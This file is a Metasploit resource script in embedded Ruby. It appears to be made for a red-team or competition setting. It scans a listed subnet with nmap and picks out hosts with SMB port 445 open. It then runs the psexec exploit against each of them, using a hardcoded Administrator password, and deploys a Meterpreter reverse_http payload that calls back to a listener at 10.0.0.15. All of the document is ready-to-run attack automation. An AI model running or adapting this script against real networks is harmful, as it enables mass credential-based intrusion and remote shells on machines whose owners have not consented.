<ruby>

smbdomain = "."
smbuser = "Administrator"
smbpass = "Password1!"
lhost = "10.0.0.15"
lport = "80"
team_subnets = ["192.168.1.0/24"]

team_subnets.each do |subnet|
  self.run_single("db_nmap -sS -O #{subnet}")
end

hosts = []
begin
  framework.db.services.each do |service|
    if ( service.port ==445 and service.state == 'open' and service.proto == 'tcp')
      hosts << {'ip' => service.host.address}
        end
    end
end

self.run_single("use exploit/windows/smb/psexec")

hosts.each do |rhost|
  self.run_single("set PrependMigrate true")  
  self.run_single("set DisablePayloadHandler true")
  self.run_single("set RHOST #{rhost['ip']}")
  self.run_single("set PAYLOAD windows/meterpreter/reverse_http")
  self.run_single("set LHOST #{lhost}")
  self.run_single("set LPORT #{lport}")
  self.run_single("set SMBDOMAIN #{smbdomain}")
  self.run_single("set SMBUSER #{smbuser}")
  self.run_single("set SMBPASS #{smbpass}")
  self.run_single("exploit -j")
  sleep 1
end
</ruby>